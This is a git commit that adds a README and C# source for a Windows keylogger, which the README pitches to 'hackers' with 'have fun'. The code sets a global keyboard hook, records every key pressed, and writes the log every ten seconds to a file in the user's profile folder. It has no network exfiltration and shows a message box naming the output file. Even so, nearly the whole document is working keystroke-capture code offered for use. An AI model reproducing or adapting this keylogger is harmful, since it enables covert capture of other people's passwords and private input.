6a2997325d95e7c616881f23862890f2b06bb2e0
LukeTheCodeMaker <luke.honeyball.03@gmail.com>
2022-05-23 12:15:46 +0200

    added the code and readme

--- README.md
+++ README.md
@@ -1,2 +1,7 @@
 # Keylogger
 A simple keylogger for hackers :).
+
+The Keys pressed are stored in C:\users\(your username)\keys\keys_pressed.txt
+
+Have fun, and use at your own risk.
+
---
+++ keylogger/cyberphobia's-kl/Program.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Gma.System.MouseKeyHook;
+using System.IO;
+namespace cyberphobia_s_kl
+{
+    internal class Program
+    {
+        static string total_String = "";
+        static pauser p = new pauser();
+        static void Main(string[] args)
+        {
+            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\keys\");
+            Gma.System.MouseKeyHook.IKeyboardEvents c = Gma.System.MouseKeyHook.Hook.GlobalEvents();
+            c.KeyDown += C_KeyDown;
+            
+            Timer t = new Timer();
+            t.Tick += T_Tick;
+            t.Interval = 10000;
+            t.Start();
+            MessageBox.Show(@"The output location is " + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\keys\keys_pressed.txt", @"Output Location");
+            
+            p.ShowDialog();
+        }
+
+        private static void T_Tick(object sender, EventArgs e)
+        {
+            write();
+        }
+
+        private static void C_KeyDown(object sender, KeyEventArgs e)
+        {
+
+            total_String += "\n" + e.KeyCode;
+            
+            
+
+        }
+        static void write()
+        {
+            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\keys\keys_pressed.txt", total_String);
+
+        }
+    }
+}
